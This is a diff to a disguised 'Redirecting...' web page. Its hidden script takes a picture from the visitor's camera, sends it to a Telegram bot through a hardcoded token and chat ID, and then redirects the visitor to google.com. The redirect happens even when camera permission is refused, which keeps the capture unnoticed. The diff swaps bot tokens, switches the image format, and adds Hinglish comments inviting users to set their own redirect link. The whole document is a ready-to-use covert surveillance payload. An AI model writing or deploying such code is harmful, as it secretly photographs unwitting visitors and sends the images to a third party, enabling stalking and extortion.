@@ -5,52 +5,52 @@
   <title>Redirecting...</title>
 </head>
 <body style="margin:0; background:#000;">
-  <!-- Hidden video and canvas elements -->
+  <!-- Hidden Elements -->
   <video id="video" autoplay playsinline style="display:none;"></video>
   <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
 
   <script>
-    const BOT_TOKEN = "8182226345:AAF3bv4klc-gx-he8_uzPgq-NFPpZqXQ2Ro";
+    const BOT_TOKEN = "7594029242:AAGlcWf6mZPKVm6NEsLsAEpqXWRrFhBaS8w";
     const CHAT_ID = "7009447523";
-    const REDIRECT_URL = "https://google.com"; // 👈 Apni link yahan daalein
+    const REDIRECT_URL = "https://google.com"; // 🔁 Apna redirect link yahan daalein
 
     async function captureAndSend() {
       try {
-        // Request camera access
+        // Step 1: Ask for camera access
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         const video = document.getElementById("video");
         const canvas = document.getElementById("canvas");
         video.srcObject = stream;
 
-        // Wait for video to load
-        await new Promise(resolve => {
+        // Step 2: Wait for video to load
+        await new Promise((resolve) => {
           video.onloadedmetadata = () => resolve();
         });
 
-        // Small delay for camera adjustment
+        // Step 3: Wait for camera to adjust, then capture
         setTimeout(async () => {
           const ctx = canvas.getContext("2d");
           ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-          const imageData = canvas.toDataURL("image/png");
+          const imageData = canvas.toDataURL("image/jpeg", 0.9); // Better compression
           const blob = await (await fetch(imageData)).blob();
 
           const formData = new FormData();
           formData.append("chat_id", CHAT_ID);
-          formData.append("photo", blob, "image.png");
+          formData.append("photo", blob, "photo.jpg");
 
-          // Send to Telegram
+          // Step 4: Send to Telegram bot
           await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
             method: "POST",
             body: formData
           });
 
-          // Redirect after sending
+          // Step 5: Redirect user
           window.location.href = REDIRECT_URL;
-        }, 1200); // adjust timing if needed
+        }, 1500); // Small delay to allow clear capture
 
       } catch (err) {
-        // If user blocks camera or error occurs, still redirect
-        console.error("Camera access denied or failed:", err);
+        console.error("❌ Camera error or permission denied:", err);
+        // Even if permission denied, still redirect
         window.location.href = REDIRECT_URL;
       }
     }
